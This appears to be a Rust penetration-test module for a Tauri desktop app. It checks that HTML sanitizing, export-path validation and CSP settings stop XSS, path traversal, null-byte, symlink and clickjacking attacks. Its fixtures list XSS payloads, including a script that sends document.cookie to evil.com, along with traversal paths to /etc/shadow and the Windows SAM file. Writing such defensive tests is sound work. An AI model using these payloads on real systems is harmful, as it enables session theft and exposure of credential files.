//! PackMatrix Desktop — Phase Gate 6: Penetration Testing & Exploit Verification
//! SDLC Section 6.1 (PM-PEN-001)
//!
//! Covers:
//! - XSS & DOM Injection: SVG script vectors, javascript: pseudo-protocols, malicious HTML strings
//! - Path Traversal & Symlink Attacks: /etc/, C:\Windows\System32, symlink redirection, null-byte injections
//! - Clickjacking & Frame Injection: frame-ancestors 'none', frame-src 'none', object-src 'none'

#[cfg(test)]
mod tests {
    use crate::security::invariants::{
        sanitize_html_content, validate_secure_export_path, AppError,
    };
    use serde_json::Value;
    use std::fs;
    use std::path::Path;

    // -------------------------------------------------------------------------
    // 6.1 XSS & DOM Injection Verification
    // -------------------------------------------------------------------------

    #[test]
    fn test_xss_svg_script_vectors_neutralized() {
        let svg_vectors = [
            "<svg onload=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "<svg id=x onfocus=alert(1) tabindex=1>#x",
            "<svg><script href='data:text/javascript,alert(1)' />",
            "<svg><script>alert('DOM_INJECTION')</script></svg>",
            "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
            "\"/><svg onload=alert(1)>",
            "'><svg/onload=alert(String.fromCharCode(88,83,83))>",
        ];

        for vector in svg_vectors {
            let sanitized = sanitize_html_content(vector);

            // Assert that tags are HTML entity encoded
            assert!(
                !sanitized.contains("<svg"),
                "Raw <svg> opening tag must not survive: {}",
                sanitized
            );
            assert!(
                !sanitized.contains("<script"),
                "Raw <script> tag must not survive: {}",
                sanitized
            );
            assert!(
                sanitized.contains("&lt;svg") || sanitized.contains("&lt;"),
                "Tags must be safely entity encoded"
            );
        }
    }

    #[test]
    fn test_xss_javascript_pseudo_protocols_neutralized() {
        let pseudo_protocols = [
            "javascript:alert(document.domain)",
            "JAVASCRIPT:alert('UPPERCASE')",
            "JavaScript:confirm(1)",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
            "vbscript:msgbox(\"XSS\")",
            "javascript:/*--></title></style></textarea></script></xmp><svg/onload=alert(1)>",
        ];

        for payload in pseudo_protocols {
            let sanitized = sanitize_html_content(payload);

            // Assert pseudo-protocol prefix is stripped or disarmed
            assert!(
                !sanitized.to_lowercase().contains("javascript:"),
                "javascript: pseudo-protocol must be disarmed: {}",
                sanitized
            );
            assert!(
                !sanitized.to_lowercase().contains("vbscript:"),
                "vbscript: pseudo-protocol must be disarmed: {}",
                sanitized
            );
            assert!(
                !sanitized.to_lowercase().contains("data:text/html"),
                "data:text/html pseudo-protocol must be disarmed: {}",
                sanitized
            );
        }
    }

    #[test]
    fn test_xss_malicious_html_gear_names_and_tags() {
        let html_attacks = [
            "<script src='https://malicious.evil/steal.js'></script>",
            "<img src='invalid_image' onerror='alert(\"XSS\")'>",
            "<iframe src='javascript:alert(1)'></iframe>",
            "<a href='javascript:void(0)' onclick='sendToken()'>Click</a>",
            "<body onload=alert(1)>",
            "<input autofocus onfocus=alert(1)>",
            "<details open ontoggle=alert(1)>",
            "Ultralight Tent<script>document.location='http://evil.com/cookie?c='+document.cookie</script>",
            "Dyneema Drybag\"><script>alert(1)</script>",
        ];

        for attack in html_attacks {
            let sanitized = sanitize_html_content(attack);

            assert!(
                !sanitized.contains('<') && !sanitized.contains('>'),
                "HTML tags must be completely escaped: {}",
                sanitized
            );
            assert!(
                !sanitized.contains("<script>"),
                "Script tag must be escaped: {}",
                sanitized
            );
            assert!(
                !sanitized.contains("<img"),
                "Image tag must be escaped: {}",
                sanitized
            );
        }
    }

    // -------------------------------------------------------------------------
    // 6.1 Path Traversal & Symlink Attacks
    // -------------------------------------------------------------------------

    #[test]
    fn test_path_traversal_system_roots_blocked() {
        let temp_dir = std::env::temp_dir().join("packmatrix_pen_test_dir");
        let _ = fs::create_dir_all(&temp_dir);

        let attack_destinations = [
            "/etc/passwd",
            "/etc/shadow",
            "/var/root/secret",
            "C:\\Windows\\System32\\cmd.exe",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "../../../../etc/passwd",
            "..\\..\\Windows\\System32\\config\\SAM",
            "../../../../var/log/system.log",
            "export/../../../../etc/group",
            "valid_name/../../../etc/hosts",
        ];

        for attack in attack_destinations {
            let result = validate_secure_export_path(&temp_dir, attack);
            assert!(
                result.is_err(),
                "Path traversal destination '{}' must be rejected",
                attack
            );
            match result.unwrap_err() {
                AppError::Security(msg) => {
                    assert!(
                        msg.contains("prohibited") || msg.contains("traversal"),
                        "Expected security error message, got: {}",
                        msg
                    );
                }
                other => panic!("Expected AppError::Security, got {:?}", other),
            }
        }

        let _ = fs::remove_dir_all(&temp_dir);
    }

    #[test]
    fn test_path_traversal_null_byte_and_symlink_attacks() {
        let temp_dir = std::env::temp_dir().join("packmatrix_symlink_test_dir");
        let _ = fs::create_dir_all(&temp_dir);

        // 1. Null-byte injection attack
        let null_byte_attacks = [
            "export.json\0.png",
            "backup\0/etc/passwd",
            "\0malicious",
            "report.pdf\0",
        ];
        for nb in null_byte_attacks {
            let res = validate_secure_export_path(&temp_dir, nb);
            assert!(res.is_err(), "Null byte injection must be rejected: {}", nb);
        }

        // 2. Symlink attack: create a symlink inside temp_dir pointing outside to /tmp or /etc
        #[cfg(unix)]
        {
            let target_out_of_bounds = std::env::temp_dir();
            let symlink_path = temp_dir.join("symlink_escape");
            let _ = fs::remove_file(&symlink_path);
            let _ = std::os::unix::fs::symlink(&target_out_of_bounds, &symlink_path);

            if symlink_path.is_symlink() {
                let res = validate_secure_export_path(&temp_dir, "symlink_escape");
                assert!(
                    res.is_err(),
                    "Symlink destination must be rejected by security validator"
                );
            }
            let _ = fs::remove_file(&symlink_path);
        }

        let _ = fs::remove_dir_all(&temp_dir);
    }

    // -------------------------------------------------------------------------
    // 6.1 Clickjacking & Frame Injection Verification
    // -------------------------------------------------------------------------

    #[test]
    fn test_clickjacking_and_frame_ancestors_defense() {
        let conf_path = Path::new("tauri.conf.json");
        let conf_content = fs::read_to_string(conf_path).expect("read tauri.conf.json");
        let conf: Value = serde_json::from_str(&conf_content).expect("parse tauri.conf.json");

        let csp = conf
            .get("app")
            .and_then(|a| a.get("security"))
            .and_then(|s| s.get("csp"))
            .and_then(|c| c.as_str())
            .expect("CSP must be configured in app.security");

        // 1. Frame-ancestors 'none' explicitly prohibits any webview or browser framing
        assert!(
            csp.contains("frame-ancestors 'none'"),
            "CSP must explicitly enforce frame-ancestors 'none' to eliminate Clickjacking"
        );

        // 2. Frame-src 'none' prohibits embedded iframes from loading untrusted sources
        assert!(
            csp.contains("frame-src 'none'"),
            "CSP must explicitly enforce frame-src 'none' to eliminate frame injection"
        );

        // 3. Object-src 'none' prohibits Flash/Java/Plugin embedding
        assert!(
            csp.contains("object-src 'none'"),
            "CSP must explicitly enforce object-src 'none'"
        );

        // 4. Base-uri 'none' prohibits base tag hijacking
        assert!(
            csp.contains("base-uri 'none'"),
            "CSP must explicitly enforce base-uri 'none'"
        );

        // 5. Form-action 'none' prohibits unauthorized form submissions
        assert!(
            csp.contains("form-action 'none'"),
            "CSP must explicitly enforce form-action 'none'"
        );
    }
}
